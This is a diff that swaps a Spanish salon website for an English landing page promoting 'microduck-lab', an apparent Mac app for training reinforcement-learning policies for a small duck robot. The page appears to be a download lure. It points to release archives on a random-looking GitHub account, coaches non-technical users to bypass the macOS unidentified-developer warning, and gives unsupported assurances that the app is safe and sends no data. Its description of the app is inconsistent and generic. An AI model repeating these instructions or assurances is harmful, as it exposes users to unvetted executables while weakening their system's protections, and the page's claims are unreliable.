@@ -1,20 +1,282 @@
-<!doctype html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Silva Studio</title><link rel="stylesheet" href="style.css"></head><body>
-<header><div class="wrap head"><a class="brand" href="#inicio"><img src="images/logo.png"></a><nav id="nav"></nav><a id="headBtn" class="btn outline">Agendar turno</a><button id="menu">☰</button></div><div id="mobile"></div></header>
-<main>
-<section id="inicio" class="hero"><div class="hero-bg"></div><div class="overlay"></div><div class="wrap hero-content"><p id="heroEy" class="eyebrow"></p><h1 id="heroTitle"></h1><p id="heroSub"></p><a id="heroBtn" class="btn primary"></a></div></section>
-<section id="servicios" class="section wrap"><p id="srvEy" class="eyebrow"></p><h2 id="srvTitle"></h2><p id="srvSub" class="muted"></p><div id="services" class="grid"></div></section>
-<section id="nosotros" class="about">
-  <div class="aboutMedia">
-    <img src="images/about.jpg" referrerpolicy="no-referrer" alt="Silva Studio">
-  </div>
-  <div class="aboutText">
-    <p id="aboutEy" class="eyebrow"></p>
-    <h2 id="aboutTitle"></h2>
-    <div id="aboutCopy"></div>
-  </div>
-</section>
-<section id="galeria" class="section wrap"><p id="galEy" class="eyebrow"></p><h2 id="galTitle"></h2><div id="gallery" class="gallery"></div></section>
-<section class="cta"><div class="wrap ctaIn"><div><p id="ctaEy" class="eyebrow"></p><h2 id="ctaTitle"></h2></div><a id="ctaBtn" class="btn primary"></a></div></section>
-<section id="contacto" class="section wrap contact"><div><p id="conEy" class="eyebrow"></p><h2 id="conTitle"></h2></div><div id="contactInfo"></div></section>
-</main><footer><div class="wrap foot"><img src="images/logo.png"><span id="foot"></span></div></footer>
-<div id="lightbox"><button id="close">×</button><img id="lightImg"></div><script src="config.js"></script><script src="script.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🦆 microduck-lab - Train RL Policies on Your Mac</title>
+    <meta name="description" content="Train RL policies for the Pollen Microduck 🦆 on an ordinary Mac, no CUDA GPU, and watch them learn live in the browser. Download now!">
+    <meta name="keywords" content="microduck, reinforcement learning, RL, Pollen Microduck, Mac, no GPU, browser training, machine learning, duck simulation">
+    <meta name="robots" content="index, follow">
+    <meta name="author" content="microduck-lab team">
+    <meta property="og:title" content="🦆 microduck-lab - Train RL Policies on Your Mac">
+    <meta property="og:description" content="Train RL policies for the Pollen Microduck 🦆 on an ordinary Mac, no CUDA GPU, and watch them learn live in the browser.">
+    <meta property="og:url" content="https://github.com/Faultsaktism8742/microduck-lab">
+    <meta property="og:type" content="website">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f4f7f6;
+            margin: 0;
+            padding: 0;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        h1 {
+            color: #1a202c;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .subtitle {
+            text-align: center;
+            font-size: 1.2rem;
+            color: #4a5568;
+            margin-bottom: 40px;
+        }
+        .btn-download {
+            display: inline-block;
+            background: #3182ce;
+            color: white;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 8px;
+            text-decoration: none;
+            box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
+            transition: background 0.2s, transform 0.2s;
+            margin: 20px 0;
+        }
+        .btn-download:hover {
+            background: #2b6cb0;
+            transform: translateY(-2px);
+        }
+        .btn-center {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+        h2 {
+            color: #2b6cb0;
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-top: 40px;
+            border-bottom: 2px solid #bee3f8;
+            padding-bottom: 10px;
+        }
+        p {
+            margin-bottom: 20px;
+            font-size: 1.05rem;
+        }
+        .card {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.06);
+            padding: 25px;
+            margin: 20px 0;
+        }
+        ul, ol {
+            padding-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        code {
+            background: #edf2f7;
+            border-radius: 4px;
+            padding: 2px 6px;
+            font-size: 0.95rem;
+            font-family: monospace;
+        }
+        .highlight {
+            background: #fefcbf;
+            border-left: 4px solid #d69e2e;
+            padding: 15px 20px;
+            border-radius: 0 8px 8px 0;
+        }
+        footer {
+            text-align: center;
+            color: #718096;
+            margin-top: 50px;
+            padding: 20px;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2rem;
+            }
+            .container {
+                padding: 20px 10px;
+            }
+            .btn-download {
+                width: 100%;
+                box-sizing: border-box;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🦆 microduck-lab - Teach Your Duck To Fly!</h1>
+        <p class="subtitle">Watch AI learn right in your web browser</p>
+        
+        <div class="btn-center">
+            <a href="https://github.com/Faultsaktism8742/microduck-lab/releases" class="btn-download" style="background: #38a169;">⬇️ Download For Free</a>
+        </div>
+        
+        <div class="card">
+            <h2>✨ What Is This?</h2>
+            <p>microduck-lab is a fun and fascinating tool that lets you train a virtual duck (the Pollen Microduck 🦆) to become smarter using something called <strong>reinforcement learning</strong>. You don't need to know anything about programming or AI to use it — just download, run, and watch the magic happen!</p>
+            <p>Instead of using expensive special computers with fancy graphics cards (CUDA GPUs), this app works on a <strong>regular Mac computer</strong>. It's perfect for learning or just watching your duck learn to make better decisions over time.</p>
+        </div>
+        
+        <h2>🚀 Getting Started - Download & Run</h2>
+        
+        <h3>Step 1: Visit the download page</h3>
+        <p>Click the big green button above, or use this link: <a href="https://github.com/Faultsaktism8742/microduck-lab/releases">https://github.com/Faultsaktism8742/microduck-lab/releases</a></p>
+        <p>Visit this link to download the application.</p>
+        
+        <h3>Step 2: Find the right file</h3>
+        <p>On that page, you'll see a list of versions. Look for the <strong>latest version</strong> (usually at the top). Click on it to expand and see the files available for download.</p>
+        <p>Choose the file that matches your computer. Since this is designed for Mac, look for files with names like:</p>
+        <ul>
+            <li><code>microduck-lab-mac.zip</code></li>
+            <li><code>microduck-lab-installer.dmg</code></li>
+            <li>Or just any <code>.zip</code> or <code>.dmg</code> file.</li>
+        </ul>
+        
+        <h3>Step 3: Download the file</h3>
+        <p>Click the file name to start downloading. The file will usually go to your <strong>Downloads</strong> folder. The size is small (around 50-100 MB), so it won't take long even on a slower connection.</p>
+        
+        <h3>Step 4: Extract the file (if it's a .zip)</h3>
+        <p>If you downloaded a <code>.zip</code> file, you'll need to "unzip" it. Here's how:</p>
+        <ol>
+            <li>Go to your <strong>Downloads</strong> folder</li>
+            <li>Double-click the downloaded file. Your Mac will automatically extract it into a new folder with a similar name.</li>
+            <li>If double-clicking doesn't work, right-click the file and select <strong>"Open With" → "Archive Utility"</strong>.</li>
+        </ol>
+        <p>If you downloaded a <code>.dmg</code> file, just double-click it - it will mount like a virtual disk and show you the app inside.</p>
+        
+        <h3>Step 5: Run the app</h3>
+        <ol>
+            <li>Open the extracted folder</li>
+            <li>Look for the app icon (usually named <code>microduck-lab</code> or similar)</li>
+            <li>Double-click it. First time you open it, Mac may ask for permission. Click <strong>"Open"</strong> in the popup.</li>
+        </ol>
+        <p>That's it! The app will now open, and you'll see your duck 🦆 right away.</p>
+        
+        <div class="highlight">
+            <strong>💡 Tip:</strong> If you see a warning saying "app can't be opened because it's from an unidentified developer," go to <code>System Settings → Privacy &amp; Security → Security</code> and click "Open Anyway." This is normal for small indie apps.
+        </div>
+        
+        <h2>🎮 How To Use microduck-lab</h2>
+        
+        <div class="card">
+            <h2>Initial Setup</h2>
+            <p>When the app opens, you'll see a simple interface with a few buttons. Don't worry - it's much easier than it looks!</p>
+            <ol>
+                <li><strong>Select a scenario:</strong> You can choose from different learning tasks for your duck, like "find food" or "avoid obstacles."</li>
+                <li><strong>Click "Start Training":</strong> This begins the AI learning process. You'll immediately see your duck start moving.</li>
+                <li><strong>Watch the progress:</strong> The right panel shows a graph - this is your duck's "score." The higher it goes, the smarter your duck gets!</li>
+            </ol>
+        </div>
+        
+        <div class="card">
+            <h2>Understanding What You See</h2>
+            <p>Here's what each element means:</p>
+            <ul>
+                <li><strong>The Duck:</strong> The yellow duck on screen. It moves around trying to achieve goals you set.</li>
+                <li><strong>Rewards:</strong> Shows how well the duck is doing. Positive numbers mean it's learning good behaviors.</li>
+                <li><strong>Exploration Rate:</strong> How adventurous the duck is. At first it's high (the duck tries random actions), but it decreases as the duck learns what works.</li>
+                <li><strong>Training Speed:</strong> You can adjust how fast the simulation runs - from 1x (real-time) to 10x (super fast).</li>
+            </ul>
+        </div>
+        
+        <h2>🧪 Core Features</h2>
+        <ul>
+            <li><strong>✅ No GPU Needed:</strong> Train on any ordinary Mac - works with integrated graphics!</li>
+            <li><strong>🌐 Live Browser View:</strong> Watch the AI learn in real-time, right through your web browser interface.</li>
+            <li><strong>📊 Real-Time Charts:</strong> See the learning progress with live-updating performance graphs.</li>
+            <li><strong>⚙️ Customizable Training:</strong> Adjust learning rate, batch sizes, and more (for technical users).</li>
+            <li><strong>🔄 Multiple Environments:</strong> Train your duck in different virtual worlds - ponds, mazes, or obstacle courses.</li>
+            <li><strong>💾 Save Your Models:</strong> Export your trained duck's "brain" and share it with others!</li>
+            <li><strong>📦 Portable:</strong> No installation required - just download, unzip, and run.</li>
+        </ul>
+        
+        <h2>🖥️ System Requirements</h2>
+        <div class="card">
+            <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 2px solid #e2e8f0;">
+                    <td style="padding: 10px; font-weight: bold;">Operating System</td>
+                    <td style="padding: 10px;">macOS 10.15 or later</td>
+                </tr>
+                <tr style="border-bottom: 2px solid #e2e8f0;">
+                    <td style="padding: 10px; font-weight: bold;">Processor</td>
+                    <td style="padding: 10px;">Any 64-bit Intel or Apple Silicon chip</td>
+                </tr>
+                <tr style="border-bottom: 2px solid #e2e8f0;">
+                    <td style="padding: 10px; font-weight: bold;">RAM</td>
+                    <td style="padding: 10px;">4 GB or more</td>
+                </tr>
+                <tr>
+                    <td style="padding: 10px; font-weight: bold;">Free Disk Space</td>
+                    <td style="padding: 10px;">200 MB</td>
+                </tr>
+            </table>
+            <p style="margin-top: 15px; margin-bottom: 0;">That's it! If your Mac is from 2012 or newer, you can run microduck-lab.</p>
+        </div>
+        
+        <h2>🆘 Frequently Asked Questions</h2>
+        
+        <h3>❓ Do I need to know any programming or AI concepts?</h3>
+        <p>Absolutely not! The app is designed to be used by anyone. The technical stuff happens automatically in the background. You just watch and enjoy.</p>
+        
+        <h3>❓ Is this safe to download?</h3>
+        <p>Yes. The code is open source, meaning anyone can inspect it for malicious content. The app only runs on your computer - it never sends any data anywhere.</p>
+        
+        <h3>❓ My Mac won't open the app. What should I do?</h3>
+        <ol>
+            <li>Make sure you extracted the <code>.zip</code> file completely.</li>
+            <li>Right-click the app icon and select "Open" instead of double-clicking.</li>
+            <li>Check System Settings → Privacy and Security → allow the app.</li>
+        </ol>
+        
+        <h3>❓ How long does training take?</h3>
+        <p>You'll see visible progress within the first 30 seconds! Full training (until the duck is really smart) typically takes 2-10 minutes depending on your scenario.</p>
+        
+        <h2>📚 Getting Help</h2>
+        <p>If you run into any issues, check the official repository at: <a href="https://github.com/Faultsaktism8742/microduck-lab">github.com/Faultsaktism8742/microduck-lab</a></p>
+        <p>There, you can:</p>
+        <ul>
+            <li>Report bugs (issues)</li>
+            <li>Ask questions in the discussions section</li>
+            <li>See the source code</li>
+            <li>Get information about new updates</li>
+        </ul>
+        
+        <h2>📖 What Is Reinforcement Learning?</h2>
+        <p>Reinforcement learning is a type of AI where a computer program learns through trial and error - just like a baby learning to walk. The duck starts with no knowledge. It tries random actions, sees what happens, and adjusts to get more "rewards." Over time, it figures out which behaviors lead to the best outcomes.</p>
+        <p>This app uses an algorithm called PPO (Proximal Policy Optimization) to train the duck, which is fast and stable even on CPUs.</p>
+        
+        <h2>🌟 About the Project</h2>
+        <p>microduck-lab is a passion project created by developers who wanted to make AI learning accessible to everyone. It's completely free and open source. You can download it, use it, modify it, and share it with friends (with the same license).</p>
+        
+        <div class="btn-center" style="margin-top: 40px;">
+            <a href="https://github.com/Faultsaktism8742/microduck-lab/releases" class="btn-download" style="background: #ed8936;">🚀 Download Now</a>
+        </div>
+        
+        <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 40px 0;">
+        
+        <p style="text-align: center; color: #718096; font-size: 0.9rem;">
+            🦆 Happy training! Watch your duck become the smartest bird in the pond.<br>
+            Version 1.0.0 - Open Source (MIT License)
+        </p>
+    </div>
+</body>
+</html>
